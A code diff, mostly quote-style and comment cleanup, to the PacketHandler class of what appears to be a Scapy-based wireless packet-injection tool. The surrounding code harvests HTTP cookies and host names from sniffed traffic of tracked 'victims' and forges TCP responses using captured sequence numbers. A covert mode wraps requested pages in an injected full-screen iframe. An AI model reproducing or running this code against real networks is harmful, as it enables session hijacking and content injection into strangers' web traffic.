@@ -132,9 +132,9 @@ class PacketHandler(object):
             except:
                 try:
                     k = cookie[0]
-                    cookie[1] = "NONE"
+                    cookie[1] = 'NONE'
                 except:
-                    cookie = ["NONE", "NONE"]
+                    cookie = ['NONE', 'NONE']
 
             if cookie[1] is not None:
                 for victim in self.victims:
@@ -151,7 +151,7 @@ class PacketHandler(object):
 
             else:
                 if cookie[0] is not None and cookie[1] is None:
-                    newcookie = [cookie[0], "NONE"]
+                    newcookie = [cookie[0], 'NONE']
                     cookie = newcookie
                     for victim in self.victims:
                         if victim.ip is not None:
@@ -174,7 +174,7 @@ class PacketHandler(object):
                     k = cookie[1]
                 except:
                     #print cookie
-                    cookie = ["NONE", "NONE"]
+                    cookie = ['NONE', 'NONE']
                 if cookie[1] is not None:
                     exists = 0
                     for victim in self.newvictims:
@@ -196,7 +196,7 @@ class PacketHandler(object):
 
                 else:
                     if cookie[0] is not None and cookie[1] is None:
-                        newcookie = [cookie[0], "NONE"]
+                        newcookie = [cookie[0], 'NONE']
                         cookie = newcookie
                         for victim in self.newvictims:
                             if victim.ip is not None:
@@ -230,7 +230,7 @@ class PacketHandler(object):
         Returns a List object [host, cookie] if there is one, otherwise returns None.
         """
         if len(ret2.strip()) > 0:
-            arr = ret2.split("\n")
+            arr = ret2.split('\n')
             #print ret2
             host = ""
             cookie = ""
@@ -263,26 +263,26 @@ class PacketHandler(object):
 
         BLOCK_HOSTS.add((svrip, seqnum))
         #print BLOCK_HOSTS
-        req = request.split("\n")
-        filename = ""
-        host = ""
+        req = request.split('\n')
+        filename = ''
+        host = ''
         for line in req:
-            if "GET" in line:
+            if 'GET' in line:
                 filename = line.split()[1].strip()
 
-            if "Host" in line:
+            if 'Host' in line:
                 host = line.split()[1].strip()
 
         if len(host) > 0 and len(filename) > 0:
             injection += """ <body style="margin:0px;padding:0px;overflow:hidden">"""
             injection += """ <iframe src=" """
             if host in filename:
-                injection += "http://" + filename[1:]
+                injection += 'http://' + filename[1:]
 
             else:
-                injection += "http://" + host + filename
+                injection += 'http://' + host + filename
                 injection += """ " frameborder="0" style="overflow:hidden;overflow-x:hidden;overflow-y:hidden;height:100%;width:100%;position:absolute;top:0px;left:0px;right:0px;bottom:0px" height="100%" width="100%"></iframe> """
-                injection += "</body>"
+                injection += '</body>'
         #print injection
         return injection
 
@@ -290,14 +290,11 @@ class PacketHandler(object):
     def condensor(self, vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr, args, injection, victim, procTimerStart):
         """Condense some of the logic into a single function"""
         if victim.victim_parameters.covert:
-            #print 'covert'
             cov_injection = self.covert_injection(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, injection)
             if (cov_injection != 0):
                 injection = cov_injection
             else:
                 return 0
-        #else:
-            #print 'not covert'
 
         #print injection
         procTimerEnd = time.time()
@@ -313,7 +310,7 @@ class PacketHandler(object):
         processed = set()
         for item in excluded:
             try:
-                test = item.split(".")
+                test = item.split('.')
                 if len(test) != 4:
                     try:
                         processed.add(socket.gethostbyname(item))
@@ -345,6 +342,7 @@ class PacketHandler(object):
 
     def proc_handler(self, packet):
         """Process handler
+        
         Obtains specific bits of the packet, orders them accordingly
         """
         if packet.haslayer(IP) and packet.haslayer(TCP):
@@ -587,7 +585,6 @@ class PacketHandler(object):
         if self.handler is not None:
             self.handler(interface, pkt)
         else:
-            #ls(pkt)
             try:
                 vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr, procTimerStart = self.proc_handler(pkt)
                 self.cookieManager(vicmac,\
@@ -620,11 +617,13 @@ class PacketHandler(object):
  
  
     def requestExtractor(self, pkt):
-        """Extracts request payload as a string from the packet object"""
-        ### This is where we can see the return from the server for the Domain=
-        ### Needed for cookieExtractor() in logger.py
-        #print pkt.sprintf("{IP:%IP.src% -> %IP.dst%\n}{Raw:%Raw.load%\n}")
+        """Extracts request payload as a string from the packet object
+        
+        This is where we can see the return from the server for the Domain=
+        Needed for cookieExtractor() in logger.py
+        """
 
+        #print pkt.sprintf("{IP:%IP.src% -> %IP.dst%\n}{Raw:%Raw.load%\n}")
         ret2 = "\n".join(pkt.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))
         if len(ret2.strip()) > 0:
             return ret2.translate(None, "'").strip()
